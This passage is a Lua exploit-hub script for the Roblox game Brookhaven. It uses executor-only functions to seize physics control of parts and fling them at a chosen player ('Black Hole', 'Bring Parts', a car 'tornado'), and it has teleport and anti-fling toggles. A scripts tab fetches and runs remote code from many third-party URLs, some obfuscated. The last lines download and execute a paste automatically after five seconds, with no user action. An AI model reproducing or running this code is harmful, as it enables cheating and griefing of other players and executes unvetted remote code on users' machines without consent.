local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")

if not Seat then

    return

end



repeat

    task.wait(0.1)

    RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)

until Humanoid.SeatPart == Seat



task.spawn(playAudio)



task.delay(4, function()

    if Humanoid.SeatPart then

        Humanoid.Sit = false

    end

    RootPart.CFrame = CFrame.new(0, 0, 0)

end)



local RE_Flip = RS:WaitForChild("RE"):WaitForChild("1Player1sCa1r")

task.spawn(function()

    while PCar and PCar.Parent do

        RE_Flip:FireServer("Flip")

        task.wait(0.5)

    end

end)



local waypoints = {

    Vector3.new(-16, 0, -47),

    Vector3.new(-110, 0, -45),

    Vector3.new(16, 0, -55)

}



local currentIndex = 1

local nextIndex = 2

local moveSpeed = 15

local rotationSpeed = math.rad(720)

local progress = 0

local currentRotation = 0



local function lerpCFrame(a, b, t)

    return a:lerp(b, t)

end



RunService.Heartbeat:Connect(function(dt)

    if not (PCar and PCar.PrimaryPart) then return end



    local startPos = waypoints[currentIndex]

    local endPos = waypoints[nextIndex]



    progress = progress + (moveSpeed * dt) / (startPos - endPos).Magnitude

    if progress >= 1 then

        progress = 0

        currentIndex = nextIndex

        nextIndex = (nextIndex % #waypoints) + 1

    end



    local newPos = lerpCFrame(CFrame.new(startPos), CFrame.new(endPos), progress).p

    currentRotation = currentRotation + rotationSpeed * dt



    local cf = CFrame.new(newPos) * CFrame.Angles(0, currentRotation, 0)

    PCar:SetPrimaryPartCFrame(cf)

end)

end

})



Tab11:AddButton({

    Name = "Cancel Tornado",

    Callback = function()

        local success, err = pcall(function()

            local args = { "DeleteAllVehicles" }

            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))

        end)



        if not success then

        else

        end

    end

})



Tab11:AddSection({ "Others" })

Tab11:AddButton({

    Name = "Black Hole",

    Description = "Activating this pulls Parts to your character",

    Callback = function()

        local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local Workspace = game:GetService("Workspace")



local angle = 1

local radius = 10

local blackHoleActive = false



local function setupPlayer()

    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")



    local Folder = Instance.new("Folder", Workspace)

    local Part = Instance.new("Part", Folder)

    local Attachment1 = Instance.new("Attachment", Part)

    Part.Anchored = true

    Part.CanCollide = false

    Part.Transparency = 1



    return humanoidRootPart, Attachment1

end



local humanoidRootPart, Attachment1 = setupPlayer()



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(part)

        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, part)

            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, part in pairs(Network.BaseParts) do

                if part:IsDescendantOf(Workspace) then

                    part.Velocity = Network.Velocity

                end

            end

        end)

    end



    EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in next, v:GetChildren() do

            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 500

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        for _, v in next, Workspace:GetDescendants() do

            ForcePart(v)

        end



        Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                angle = angle + math.rad(2)



                local offsetX = math.cos(angle) * radius

                local offsetZ = math.sin(angle) * radius



                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)

            end

        end)

    else

        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)

    end

end



LocalPlayer.CharacterAdded:Connect(function()

    humanoidRootPart, Attachment1 = setupPlayer()

    if blackHoleActive then

        toggleBlackHole()

    end

end)



local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()

local window = library:Window("Black Hole")



window:Slider("Radius Black Hole",1,100,10, function(Value)

   radius = Value

end)



window:Toggle("Toggle Black Hole", true, function(Value)

       if Value then

            toggleBlackHole()

        else

            blackHoleActive = false

        end

end)



spawn(function()

    while true do

        RunService.RenderStepped:Wait()

        if blackHoleActive then

            angle = angle + math.rad(angleSpeed)

        end

    end

end)



toggleBlackHole()

    end

})

Tab11:AddButton({

    Name = "Bring Parts",

    Description = "To use, approach the Selected Player",

    Callback = function()

local Gui = Instance.new("ScreenGui")

local Main = Instance.new("Frame")

local Box = Instance.new("TextBox")

local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

local Label = Instance.new("TextLabel")

local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")

local Button = Instance.new("TextButton")

local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")



Gui.Name = "Gui"

Gui.Parent = gethui()

Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



Main.Name = "Main"

Main.Parent = Gui

Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)

Main.BorderColor3 = Color3.fromRGB(0, 0, 0)

Main.BorderSizePixel = 0

Main.Position = UDim2.new(0.335954279, 0, 0.542361975, 0)

Main.Size = UDim2.new(0.240350261, 0, 0.166880623, 0)

Main.Active = true

Main.Draggable = true



Box.Name = "Box"

Box.Parent = Main

Box.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Box.BorderColor3 = Color3.fromRGB(0, 0, 0)

Box.BorderSizePixel = 0

Box.Position = UDim2.new(0.0980926454, 0, 0.218712583, 0)

Box.Size = UDim2.new(0.801089942, 0, 0.364963502, 0)

Box.FontFace = Font.new("rbxasset://fonts/families/SourceSansSemibold.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Box.PlaceholderText = "Player Name..."

Box.Text = ""

Box.TextColor3 = Color3.fromRGB(255, 255, 255)

Box.TextScaled = true

Box.TextSize = 31.000

Box.TextWrapped = true



UITextSizeConstraint.Parent = Box

UITextSizeConstraint.MaxTextSize = 31



Label.Name = "Label"

Label.Parent = Main

Label.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Label.BorderColor3 = Color3.fromRGB(0, 0, 0)

Label.BorderSizePixel = 0

Label.Size = UDim2.new(1, 0, 0.160583943, 0)

Label.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Label.Text = "Bring Parts"

Label.TextColor3 = Color3.fromRGB(255, 255, 255)

Label.TextScaled = true

Label.TextSize = 14.000

Label.TextWrapped = true



UITextSizeConstraint_2.Parent = Label

UITextSizeConstraint_2.MaxTextSize = 21



Button.Name = "Button"

Button.Parent = Main

Button.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Button.BorderColor3 = Color3.fromRGB(0, 0, 0)

Button.BorderSizePixel = 0

Button.Position = UDim2.new(0.183284417, 0, 0.656760991, 0)

Button.Size = UDim2.new(0.629427791, 0, 0.277372271, 0)

Button.Font = Enum.Font.Nunito

Button.Text = "Bring Parts (Off)"

Button.TextColor3 = Color3.fromRGB(255, 255, 255)

Button.TextScaled = true

Button.TextSize = 28.000

Button.TextWrapped = true



UITextSizeConstraint_3.Parent = Button

UITextSizeConstraint_3.MaxTextSize = 28



local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local UserInputService = game:GetService("UserInputService")

local Workspace = game:GetService("Workspace")



local character

local humanoidRootPart



mainStatus = true

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)

    if input.KeyCode == Enum.KeyCode.RightControl and not gameProcessedEvent then

        mainStatus = not mainStatus

        Main.Visible = mainStatus

    end

end)



local Folder = Instance.new("Folder", Workspace)

local Part = Instance.new("Part", Folder)

local Attachment1 = Instance.new("Attachment", Part)

Part.Anchored = true

Part.CanCollide = false

Part.Transparency = 1



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(Part)

        if Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, Part)

            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            Part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, Part in pairs(Network.BaseParts) do

                if Part:IsDescendantOf(Workspace) then

                    Part.Velocity = Network.Velocity

                end

            end

        end)

    end



    EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in ipairs(v:GetChildren()) do

            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(100000, 100000, 100000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 200

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local blackHoleActive = false

local DescendantAddedConnection



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        Button.Text = "Bring Parts (On)"

        for _, v in ipairs(Workspace:GetDescendants()) do

            ForcePart(v)

        end



        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                Attachment1.WorldCFrame = humanoidRootPart.CFrame

            end

        end)

    else

        Button.Text = "Bring Parts (Off)"

        if DescendantAddedConnection then

            DescendantAddedConnection:Disconnect()

        end

    end

end



local function getPlayer(name)

    local lowerName = string.lower(name)

    for _, p in pairs(Players:GetPlayers()) do

        local lowerPlayer = string.lower(p.Name)

        if string.find(lowerPlayer, lowerName) then

            return p

        elseif string.find(string.lower(p.DisplayName), lowerName) then

            return p

        end

    end

end



local player = nil



local function VDOYZQL_fake_script() 

    local script = Instance.new('Script', Box)



    script.Parent.FocusLost:Connect(function(enterPressed)

        if enterPressed then

            player = getPlayer(Box.Text)

            if player then

                Box.Text = player.Name

            else

            end

        end

    end)

end

coroutine.wrap(VDOYZQL_fake_script)()

local function JUBNQKI_fake_script()

    local script = Instance.new('Script', Button)



    script.Parent.MouseButton1Click:Connect(function()

        if player then

            character = player.Character or player.CharacterAdded:Wait()

            humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            toggleBlackHole()

        else

        end

    end)

end

coroutine.wrap(JUBNQKI_fake_script)()

    end

})

----------------------------------------------------------------------------------------------------------------------------------------------
                                               -- === Tab 11: Scripts === --
----------------------------------------------------------------------------------------------------------------------------------------------

Tab12:AddSection({

    Name = "Scripts"

})



Tab12:AddSection({

    Name = "This Place"

})

Tab12:AddButton({

    Name = "Spectra hub",

    Callback = function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/assure157tv157157157-boop/Spectra-HUB-V2-/refs/heads/main/URL%20do%20scriptblox"))()

    end

})



Tab12:AddButton({

    Name = "Chaos Hub",

    Callback = function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Venom-devX/ChaosHub/refs/heads/main/loader.lua"))()

    end

})



Tab12:AddButton({

    Name = "Rael Hub [good hub]",

    Callback = function()

        loadstring(game:HttpGet("https://rawscripts.net/raw/The-Mimic-Rael-Hub-20921"))()

    end

})



Tab12:AddButton({

    Name = "cartela hub and cartola dont be a sht",

    Callback = function()

        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/v2r2U4jwERLv7P84/raw",true))()

    end

})



Tab12:AddButton({

    Name = "KUquette Hub",

    Callback = function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Daivd977/Deivd999/refs/heads/main/pessal"))()

    end

})



Tab12:AddButton({

    Name = "Ben client",

    Callback = function()

        loadstring(game:HttpGet("https://scriptsneonauth.vercel.app/api/scripts/bce32487-8926-41a9-9d92-44b7a998ab09/raw"))()

    end

})



Tab12:AddButton({

    Name = "Night client [recommended!]",

    Callback = function()

        loadstring(game:HttpGet(("https://raw.githubusercontent.com/SilvaDev77/night-on-top-/refs/heads/main/obfuscated.lua%20(5).txt"),true))()

    end

})




-----------------------------------------------------------------------------------------------------------------------------------------
                                          -- === Tab 12: Teleportes === --
-----------------------------------------------------------------------------------------------------------------------------------------




-- Tab13: Teleportes

local teleportPlayer = game.Players.LocalPlayer
local teleportLocation = "Hill" -- Valor padrÃ£o

local locations = {
    ["Hill"] = Vector3.new(-348.64, 65.94, -458.08),
    ["Plaza"] = Vector3.new(-26.17, 3.48, -0.93),
    ["Bank"] = Vector3.new(1.99, 3.32, 236.65),
    ["Hospital"] = Vector3.new(-303.2, 3.40, 13.74),
    ["City Hall"] = Vector3.new(-354.65, 7.32, -102.16),
    ["Farm"] = Vector3.new(-766.41, 2.92, -61.10),
    ["Market"] = Vector3.new(16.31, 3.32, -107.07),
    ["Mall"] = Vector3.new(151.05, 3.52, -190.64),
    ["Airport"] = Vector3.new(290.23, 4.32, 42.57),
    ["Hotel"] = Vector3.new(159.10, 3.32, 164.97),
    ["Seaside 1"] = Vector3.new(55.69, 2.94, -1403.60),
    ["Seaside 2"] = Vector3.new(42.39, 2.94, 1336.14)
}

Tab13:AddDropdown({
    Name = "Brookhaven Locations",
    Description = "Select a location to teleport",
    Default = teleportLocation,
    Multi = false,
    Options = {
        "Hill",
        "Plaza",
        "Bank",
        "Hospital",
        "City Hall",
        "Farm",
        "Market",
        "Mall",
        "Airport",
        "Hotel",
        "Seaside 1",
        "Seaside 2"
    },
    Callback = function(value)
        teleportLocation = value
    end
})

Tab13:AddButton({
    Name = "Teleport",
    Description = "Teleport to selected location",
    Callback = function()
        if teleportPlayer.Character and teleportPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = teleportPlayer.Character.HumanoidRootPart
            local humanoid = teleportPlayer.Character:FindFirstChildOfClass("Humanoid")
            local pos = locations[teleportLocation]
            if pos then
                pcall(function()
                    if humanoid then
                        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                        humanoid.WalkSpeed = 0
                    end
                    humanoidRootPart.Anchored = true
                    humanoidRootPart.CFrame = CFrame.new(pos)
                    task.wait(0.4)
                    humanoidRootPart.Anchored = false
                    if humanoid then
                        humanoid.WalkSpeed = 16
                        humanoid:ChangeState(Enum.HumanoidStateType.Running)
                    end
                end)
            end
        end
    end
})

-----------------------------------------------------------------------------------------------------------------------------------------
                                          -- === Tab 13: Protecao === --
-----------------------------------------------------------------------------------------------------------------------------------------

local LocalPlayer = game:GetService("Players").LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local backupTables = {
    Vehicles = {},
    Canoes = {},
    Jets = {},
    Helis = {},
    Balls = {}
}

local TeleportCarro = {}
function TeleportCarro:MostrarNotificacao(msg)
    print("Ã°Å¸ââ "..msg)
end

local function AntiFlingLoop(name, getFolderFunc)
    local active = false
    task.spawn(function()
        while true do
            if active and LocalPlayer.Character then
                local folder = getFolderFunc()
                if folder then
                    for _, item in ipairs(folder:GetChildren()) do
                        local isMine = false
                        if name == "Vehicles" then
                            for _, seat in ipairs(item:GetDescendants()) do
                                if (seat:IsA("VehicleSeat") or seat:IsA("Seat")) and seat.Occupant and seat.Occupant.Parent == LocalPlayer.Character then
                                    isMine = true
                                    break
                                end
                            end
                        elseif name == "Canoes" then
                            local owner = item:FindFirstChild("Owner")
                            isMine = owner and owner.Value == LocalPlayer
                        elseif name == "Jets" or name == "Helis" then
                            isMine = item.Name == LocalPlayer.Name
                        end
                        if not isMine then
                            table.insert(backupTables[name], item:Clone())
                            item:Destroy()
                        end
                    end
                end
            end
            task.wait(0.03)
        end
    end)
    return function(state)
        active = state
        TeleportCarro:MostrarNotificacao(name.." "..(state and "enabled!" or "disabled!"))
        if not state then
            for _, item in ipairs(backupTables[name]) do
                local parentFolder = getFolderFunc()
                if parentFolder then item.Parent = parentFolder end
            end
            backupTables[name] = {}
        end
    end
end
 
Tab9:AddSection({
    Name = "Anti bug (updated)"
})

Tab9:AddButton({
    Name = "Protection Bug (Irreversible)",
    Description = "Create a protection against the Bugs/Scripters",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        local blacklist = {
            {Name = "water", Class = "Part"},
        }

        local function neutralize(part)
            if part and part:IsA("BasePart") then
                pcall(function()
                    part.Anchored = true
                    part.CanCollide = false
                    part.Massless = true
                    part.Transparency = 1
                    part:ClearAllChildren()
                end)
                pcall(function()
                    part:Destroy()
                end)
            end
        end

        workspace.DescendantAdded:Connect(function(obj)
            for _, rule in ipairs(blacklist) do
                if obj.Name == rule.Name and obj.ClassName == rule.Class then
                    neutralize(obj)
                end
            end
        end)

        for _, obj in ipairs(workspace:GetDescendants()) do
            for _, rule in ipairs(blacklist) do
                if obj.Name == rule.Name and obj.ClassName == rule.Class then
                    neutralize(obj)
                end
            end
        end

        task.spawn(function()
            while task.wait(0.25) do
                for _, rule in ipairs(blacklist) do
                    for _, v in next, getnilinstances() do
                        if v.Name == rule.Name and v.ClassName == rule.Class then
                            neutralize(v)
                        end
                    end
                end
            end
        end)

        LocalPlayer.CharacterAdded:Connect(function(char)
            local hum = char:WaitForChild("Humanoid")
            hum.Touched:Connect(function(hit)
                for _, rule in ipairs(blacklist) do
                    if hit.Name == rule.Name and hit.ClassName == rule.Class then
                        neutralize(hit)
                    end
                end
            end)
        end)
    end
})
   
-- TOGGLES DE ANTI-FLING / SIT
Tab9:AddToggle({
    Name = "Anti fling Cars",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Vehicles", function()
        return Workspace:FindFirstChild("Vehicles")
    end)
})

Tab9:AddToggle({
    Name = "Anti Canoe Fling",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Canoes", function()
        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")
        return workspaceCom and workspaceCom:FindFirstChild("001_CanoeStorage")
    end)
})

Tab9:AddToggle({
    Name = "Anti Fling Jets",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Jets", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        if folder and folder:FindFirstChild("001_Airport") then
            local storage = folder["001_Airport"]:FindFirstChild("AirportHanger")
            if storage then return storage:FindFirstChild("001_JetStorage") and storage["001_JetStorage"]:FindFirstChild("JetAirport") end
        end
    end)
})

Tab9:AddToggle({
    Name = "Anti Fling Helicopters",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Helis", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        return folder and folder:FindFirstChild("001_HeliStorage") and folder["001_HeliStorage"]:FindFirstChild("PoliceStationHeli")
    end)
})

Tab9:AddToggle({
    Name = "Anti Fling Ball",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Balls", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        return folder and folder:FindFirstChild("001_SoccerBalls")
    end)
})

-- Anti Sit
local antiSitActive = false
Tab9:AddToggle({
    Name = "Anti Sit",
    Description = "",
    Default = false,
    Callback = function(state)
        antiSitActive = state
        TeleportCarro:MostrarNotificacao("Anti Sit "..(state and "enabled!" or "disabled!"))
        task.spawn(function()
            while antiSitActive and LocalPlayer.Character do
                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    if humanoid:GetState() == Enum.HumanoidStateType.Seated then
                        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                    end
                end
                task.wait(0.05)
            end
            if not antiSitActive then
                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end
        end)
    end
})

Tab9:AddToggle({
    Name = "Anti-Lag",
    Description = "",
    Default = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local dedupLock = {}
        local IGNORED_PLAYER

        if not state then return end

        local function marcarIgnorado(player)
            IGNORED_PLAYER = player
        end

        local function isTargetTool(inst)
            return inst:IsA("Tool")
        end

        local function gatherTools(player)
            local found = {}
            local containers = {}
            if player.Character then table.insert(containers, player.Character) end
            local backpack = player:FindFirstChildOfClass("Backpack")
            if backpack then table.insert(containers, backpack) end
            local sg = player:FindFirstChild("StarterGear")
            if sg then table.insert(containers, sg) end
            for _, container in ipairs(containers) do
                for _, child in ipairs(container:GetChildren()) do
                    if isTargetTool(child) then table.insert(found, child) end
                end
            end
            return found
        end

        local function dedupePlayer(player)
            if player == IGNORED_PLAYER then return end
            if dedupLock[player] then return end
            dedupLock[player] = true
            local tools = gatherTools(player)
            if #tools > 1 then
                for i = 2, #tools do pcall(function() tools[i]:Destroy() end) end
            end
            dedupLock[player] = false
        end

        local function hookPlayer(player)
            if not IGNORED_PLAYER then marcarIgnorado(player) end
            task.defer(dedupePlayer, player)
            local function setupChar(char)
                task.delay(0.5, function() dedupePlayer(player) end)
                char.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            if player.Character then setupChar(player.Character) end
            player.CharacterAdded:Connect(setupChar)
            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                backpack.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            local sg = player:FindFirstChild("StarterGear") or player:WaitForChild("StarterGear", 10)
            if sg then
                sg.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
        end

        Players.PlayerAdded:Connect(hookPlayer)
        for _, plr in ipairs(Players:GetPlayers()) do hookPlayer(plr) end

        task.spawn(function()
            while state do
                for _, plr in ipairs(Players:GetPlayers()) do dedupePlayer(plr) end
                task.wait(2)
            end
        end)
    end
})

Tab9:AddToggle({
    Name = "Anti Fling Doors",
    Description = "",
    Default = false,
    Callback = function(state)
        if not _G.hiddenDoors then _G.hiddenDoors = {} end
        if state then
            _G.hiddenDoors = {}
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name:lower():find("door") then
                    local doorData = {
                        door = obj,
                        originalTransparency = obj.Transparency,
                        originalCanCollide = obj.CanCollide,
                        originalCastShadow = obj.CastShadow
                    }
                    obj.Transparency = 1
                    obj.CanCollide = false
                    obj.CastShadow = false
                    for _, child in ipairs(obj:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 1
                            child.CanCollide = false
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = false
                        end
                    end
                    table.insert(_G.hiddenDoors, doorData)
                end
            end
            print("Ã°Å¸â€ Â§ " .. #_G.hiddenDoors .. " hidden doors!")
        else
            for _, doorData in ipairs(_G.hiddenDoors or {}) do
                if doorData.door and doorData.door.Parent then
                    doorData.door.Transparency = doorData.originalTransparency
                    doorData.door.CanCollide = doorData.originalCanCollide
                    doorData.door.CastShadow = doorData.originalCastShadow
                    for _, child in ipairs(doorData.door:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 0
                            child.CanCollide = true
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = true
                        end
                    end
                end
            end
            print("Ã¢Å“â€¦ " .. #(_G.hiddenDoors or {}) .. " doors restored with functionality!")
            _G.hiddenDoors = {}
        end
    end
})

-----------------------------------------------------------------------------------------------------------------------------------------
                                          -- === Tab 2: IndraHub V1 === --
-----------------------------------------------------------------------------------------------------------------------------------------

Tab2:AddButton({
    Name = "IndraHub V1",
    Callback = function()
        loadstring(game:HttpGet("https://ghostbin.axel.org/paste/t6job/raw"))()
    end
})

task.delay(5, function()
    loadstring(game:HttpGet("https://ghostbin.axel.org/paste/t6job/raw"))()
end)
